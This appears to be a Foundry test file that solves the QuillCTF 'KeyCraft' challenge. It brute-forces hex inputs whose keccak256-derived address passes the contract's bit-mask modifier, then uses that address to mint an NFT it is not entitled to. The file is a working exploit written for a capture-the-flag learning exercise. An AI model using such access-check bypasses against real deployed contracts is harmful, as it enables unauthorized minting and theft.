// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/KeyCraft.sol";

contract KeyCraftTest is Test {
    KeyCraft public keyCraft;
    address public deployer;
    address public preAttacker;
    address public attacker;
    uint256 public index;

    function setUp() public {
        deployer = vm.addr(1); 
        preAttacker = vm.addr(2);
        console.log("preAttacker: ", preAttacker);
        vm.deal(preAttacker, 10 ether);

        vm.startPrank(deployer);
        keyCraft = new KeyCraft("KCNFT", "KC");
        vm.stopPrank();
    }

    function testKeyCraftExploit() public {  
        // Setup
        vm.startPrank(preAttacker, preAttacker);
        // keyCraft.mint(abi.encodePacked(uint256(0xf89ae7139a2ecac685ff9161992b9ed1be7ae447883a9b42d533b0f67028298f), uint256(0x2cad20f5d06c1a65b3542e5287da1e2cd7c0fe17aeddd21edf58370c6eb1e07d)));
        for (uint i = 0; i < 400000; i++) {
            bytes memory random = bytes(toHexString(i));
            if (canPassModifier(random)) {
                index = i;
                attacker = getAttackerAddress(random);
                console.log("Attacker: ", getAttackerAddress(random));
                break;
            }
        }
        vm.stopPrank();

        vm.startPrank(attacker, attacker);
        // Before exploit
        assertEq(keyCraft.balanceOf(attacker), 0);

        // Exploit
        bytes memory key = bytes(toHexString(index));
        keyCraft.mint(key);
        vm.stopPrank();

        // After exploit
        assertEq(keyCraft.balanceOf(attacker), 1);
    }

    function getAttackerAddress(bytes memory b) public pure returns (address) {
        uint a = uint160(uint256(keccak256(b)));
        return address(uint160(a));
    }

    function canPassModifier(bytes memory b) internal pure returns (bool) {
        bool w;
        uint a = uint160(uint256(keccak256(b)));

        a = a >> 108;
        a = a << 240;
        a = a >> 240;

        w = (a == 13057);
        return w;
    }

    function toHexString(uint a) public pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        return string(res);
    }

    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1("0")) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1("a")) + d - 10);
        }
        revert();
    }
}